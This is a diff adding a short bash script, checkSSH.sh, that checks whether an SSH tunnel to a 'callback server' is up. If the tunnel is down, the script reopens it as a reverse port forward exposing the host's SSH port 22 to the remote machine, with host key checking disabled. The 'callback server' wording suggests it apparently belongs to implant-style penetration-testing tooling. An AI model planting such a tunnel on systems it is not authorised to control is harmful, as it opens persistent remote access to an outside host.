@@ -1,0 +1,15 @@
+#!/bin/bash
+#title                  :checkSSH.sh
+#description            :This script will verify that the SSH Tunnel to the callback server is up. 
+#author                 :Robin Lennox
+#==============================================================================
+
+randomPort=$(shuf -i 2000-65000 -n 1)
+sshUser='SET_USER'
+callbackIP='SET_IP'
+callbackPort='SET_PORT'
+checkSSHTunnel=$(sudo netstat -tnpa | grep 'ESTABLISHED.*ssh' | grep ${callbackIP})
+
+if [ -z "${checkSSHTunnel}" ]; then
+   sudo ssh -f -N -R ${randomPort}:localhost:22 ${sshUser}@${callbackIP} -p${callbackPort} -oStrictHostKeyChecking=no -i /home/${sshUser}/.ssh/id_rsa
+fi
